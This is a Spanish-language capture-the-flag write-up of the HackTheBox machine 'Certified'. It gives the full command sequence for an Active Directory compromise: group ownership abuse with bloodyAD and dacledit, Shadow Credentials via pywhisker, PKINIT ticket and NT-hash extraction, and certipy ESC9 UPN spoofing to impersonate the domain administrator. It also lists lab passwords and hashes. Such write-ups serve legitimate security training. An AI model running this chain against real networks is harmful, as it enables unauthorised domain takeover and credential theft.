---
title: write up Certified HTB
excerpt:
date: 2025-3-18
classes: wide
header:
  teaser: https://404zzero.github.io/zzero.github.io//assets/images/certified/certified_avatar.png
  teaser_home_page: true
categories:
  - hacking
  - Windows
  - ctf
  - netexect
  - bloodhunt
  - adcs
  - certipy
  - ESC9
  - hackthebox
tags:  
  - hacking
  - Windows
  - ctf
  - netexect
  - bloodhunt
  - adcs
  - certipy
  - ESC9
  - hackthebox
  ---

"Certified" es una máquina de dificultad media en HackTheBox que involucra un entorno de Active Directory. Al comenzar, se nos proporcionan credenciales de un usuario inicial que tiene la capacidad de agregarse a un grupo específico. Aprovechando este privilegio, podemos unirnos a dicho grupo y ejecutar un ataque de Shadow Credentials contra otro usuario, lo que nos permite obtener su hash NT. Este segundo usuario también es vulnerable al mismo ataque, permitiéndonos comprometer la cuenta de un tercer usuario. Esta última cuenta tiene permisos para gestionar certificados, lo que abre la posibilidad de explotar la vulnerabilidad ESC9 en el servicio AD CS. A través de esta técnica, logramos escalar privilegios y suplantar la identidad del Administrador del dominio.

lo primero como siempre el escaneo de Nmap

```bash
nmap -p- --open --min-rate 5000 -sT -vvv -n -Pn 10.10.11.41 -oG allports
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241219142548.png)

```bash
nmap -sVC -p53,88,135,139,389,445,593,636,3269,5985,9389,49666,49668,49673,49674,49683,49773 10.10.11.41 -oN ports
```

```bash
9683,49773 10.10.11.41 -oN ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 14:25 CET
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 70.59% done; ETC: 14:26 (0:00:12 remaining)
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.66% done; ETC: 14:26 (0:00:00 remaining)
Nmap scan report for 10.10.11.41
Host is up (0.030s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-12-19 20:25:45Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-19T20:27:14+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-19T20:27:14+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp  open  globalcatLDAPssl?
|_ssl-date: 2024-12-19T20:27:14+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  unknown
49683/tcp open  unknown
49773/tcp open  unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-19T20:26:11
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.63 seconds
```


comprovamos las credenciaales del usuario que nos da por defetcto HTB y aparte saco el dominio 
```bash
nxc smb 10.10.11.41 -u 'judith.mader' -p 'judith09'
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241219143502.png)

vamos a sacar el bloodhunt de esta mquina para poder usarlo

```bash
python3 bloodhound.py -d certified.htb -ns 10.10.11.41 -u judith.mader -p judith09 -c All --zip
```

nos genera un .zip
yo lo voy a abrir usando la version de docker
![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220115214.png)
descubrimos esta estructura
porlo que podemos intenar ganar acceso a Management y des hay a CA_operartor  y despues ser admin

lo primero es conseguir estar dentro del grupo y conseguir permisos de scritura 

como no tenemos sesion winrm vamos a tener que hacerlo todo desde la terminal 
primero vamos a usar bloodyAD para acer nuestro usuario dueño del grupo
https://github.com/CravateRouge/bloodyAD
(NOTA:  no se porque ahora HTB te da ya los permisos de propietario y escritura pero auna si yo voy a hacer el como se conseguirian)

```bash
python3 bloodyAD.py --host "10.10.11.41" -d 'certified.htb' -u 'judith.mader' -p 'judith09' set owner Management judith.mader
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220120508.png)

ahora vamos a conseguir los permisos de escritura con dacledit.py
https://github.com/fortra/impacket/blob/master/examples/dacledit.py

```bash
python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220121029.png)

perfecto por lo que como tenemos ya estos permisos ya podemos añadir a Management al grupo
para ello vamos a volver a usar bloodAD

```bash
python3 bloodyAD.py --host "10.10.11.41" -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220121534.png)

vale perfecto ahora como somos totalmente del grupo podemos intentar sacar el certificado al usuario management_svc
vamos a usar pywhisker
https://github.com/ShutdownRepo/pywhisker

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220122103.png)

ahora vamos usar kerberos para intentar conseguir el ticket (TGT) gracias al certificado que emos conseguido

para esto vamos a usar gettgtpkinit gunto al archivo .pfx y la contraseña que nos da
https://github.com/dirkjanm/PKINITtools

```bash
 python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/zzero/certified/content/pywhisker/pywhisker/GMgSVanb.pfx -pfx-pass EwVgr6W570k5CtV5i4tB fuck2.ccache
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220122945.png)
no suelta un erro y es por el tema de zona horaria para solucionarlo hay que hacer lo siguiente

```bash
ntpdate certified.htb
```

volvemos a ejecutar el comando y

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193054.png)

ya funciono por lo que tenemos ticket y .ccache

ahora ya que tenemos esto podemos intentar sacar el hash nt
para ello vamos a usar getnthash gunto a los datos anteriores
https://github.com/dirkjanm/PKINITtools

lo primero tenemos que declarar la siguiente variable
en mi caso seria asi
```bash
export KRB5CCNAME=/home/zzero/certified/content/PKINITtools/fuck2.ccache
```
tenemos que referncia al .ccache asi 

y ahora ejecutamos de la siguiente forma

```bash
python3 getnthash.py certified.htb/management_svc -key d7964090a53e45440fe4f7dbbfc0f3ad8555820724dc83dbeb1eb6d673f7ed04
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193550.png)

tenemos hahs por lo que podemos acceder a la mquina 

verificamos que tengamos winrm con el usuario management_svc con netexect

```bash
nxc winrm 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220193752.png)

tenemos acceso pero no nos vale de nada porque es solo para la flag

## root

como tenemos control de management_svc podemos intentar ganar control de ca_operator
lo primero 
vamos a modificar sus credenciales con certipy-ad
https://github.com/ly4k/Certipy

```bash
certipy shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```
![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194456.png)

tenemos un segundo hash
ahora actualizamos su UPN
```bash
certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn administrator
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194635.png)

pedimos un certificado de administrador
```bash
certipy req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220194906.png)

ahora restauramos el NPU original

```bash
certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn ca_operator@certified.htb
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195004.png)

y obtenemos el TGT de admin

```bash
certipy auth -pfx administrator.pfx -domain certified.htb
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195111.png)

y ya con netexect comprovamos si tenemos acceso

```bash
nxc winrm 10.10.11.41 -u 'administrator' -H '0d5b49608bbce1751f708748f67e2d34'
```

![](https://404zzero.github.io/zzero.github.io//assets/images/certified/Pasted-image-20241220195224.png)

